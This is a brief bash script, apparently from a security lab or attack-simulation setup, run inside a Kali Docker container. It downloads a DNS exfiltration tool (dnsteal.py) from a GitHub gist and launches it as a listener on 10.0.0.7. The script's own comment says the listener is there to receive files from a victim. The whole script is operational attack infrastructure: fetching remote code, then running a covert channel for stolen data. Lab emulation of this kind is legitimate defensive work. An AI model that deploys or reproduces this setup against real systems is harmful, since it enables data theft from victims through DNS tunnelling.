#!/bin/bash

# Setup dnssteal to receive files from victim
docker exec kali /bin/sh -c "\
                                apt update -y; \
                                apt install python2 -y; \
                                mkdir /tmp/dnsteal; \
                                apt install wget -y; \
                                wget https://gist.githubusercontent.com/kevinnivekkevin/0537f0254a6daf19b4141a6d7e1f5697/raw/977a3f61e15de194e04efe209cca630e54e9d6ce/dnsteal.py -O /tmp/dnsteal/dnsteal.py;\
                                chmod +x /tmp/dnsteal/dnsteal.py;"

docker exec kali /bin/bash -c "nohup python2 /tmp/dnsteal/dnsteal.py 10.0.0.7 &> output & sleep 1"